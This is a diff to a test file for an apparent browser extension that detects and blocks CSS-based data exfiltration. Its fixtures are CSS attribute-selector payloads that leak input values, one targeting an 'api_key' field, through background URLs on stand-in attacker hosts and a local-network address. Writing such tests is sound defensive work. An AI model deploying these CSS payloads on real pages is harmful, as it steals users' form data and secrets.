@@ -148,6 +148,26 @@ describe("browser integrations", () => {
     expect(status?.ruleCount).toBe(1);
   });
 
+
+  it("prioritizes stronger DNR candidates when the dynamic rule cap is reached", async () => {
+    const remoteFindings = Array.from({ length: 55 }, (_, index) => analyzeStylesheet({
+      cssText: `input[value^="${String.fromCharCode(97 + (index % 26))}"]{background:url(https://attacker-${index}.example/leak)}`,
+      pageUrl: "https://app.example/",
+      sourceKind: "style_element",
+      sourceUrl: "https://app.example/"
+    }).findings[0] as Finding);
+    const localNetworkFinding = analyzeStylesheet({
+      cssText: 'input[name="api_key"][value^="x"]{background:url(http://192.168.0.12/leak)}',
+      pageUrl: "https://app.example/",
+      sourceKind: "style_element",
+      sourceUrl: "https://app.example/"
+    }).findings[0] as Finding;
+
+    const result = await blockHighConfidenceFindingUrls([...remoteFindings, localNetworkFinding], 27);
+    expect(result.blockedFindings.has(localNetworkFinding.id)).toBe(true);
+    expect(result.blockedUrls).toContain("http://192.168.0.12/leak");
+  });
+
   it("caps report frames and findings before storage", async () => {
     const summary = analyzeStylesheet({ cssText: 'input[value^="a"]{background:url(https://attacker.example/a)}', pageUrl: "https://app.example/", sourceKind: "style_element", sourceUrl: "https://app.example/" });
     const noisySummary = { ...summary, findings: Array.from({ length: REPORT_LIMITS.maxFindingsPerFrame + 20 }, () => summary.findings[0] as Finding) };
